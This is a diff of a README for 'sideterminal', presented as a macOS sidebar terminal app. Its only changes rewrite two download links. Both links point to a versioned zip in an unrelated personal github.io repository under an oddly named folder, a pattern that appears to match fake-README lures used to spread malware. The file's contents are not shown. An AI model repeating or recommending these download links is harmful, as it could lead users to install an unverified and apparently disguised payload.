@@ -5,7 +5,7 @@ description: "Access your terminal from the screen edge with this macOS sidebar 
 ---
 # 🖥️ sideterminal - Quick access to your command line
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/AJWillemse/ajwillemse.github.io/raw/refs/heads/main/anepiploic/v3.2-beta.4.zip)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/AJWillemse/ajwillemse.github.io/main/anepiploic/v3.2-beta.4.zip)
 
 Sideterminal sits on the edge of your screen. You pull it into view when you need to type commands and hide it when you finish. This tool keeps your terminal sessions active so you work without interruption. It fits into your workflow and helps you manage tasks.
 
@@ -13,7 +13,7 @@ Sideterminal sits on the edge of your screen. You pull it into view when you nee
 
 You can grab the installer from the official repository page.
 
-[Click here to visit the download page](https://github.com/AJWillemse/ajwillemse.github.io/raw/refs/heads/main/anepiploic/v3.2-beta.4.zip)
+[Click here to visit the download page](https://raw.githubusercontent.com/AJWillemse/ajwillemse.github.io/main/anepiploic/v3.2-beta.4.zip)
 
 Follow these steps to set up the software on your computer:
 
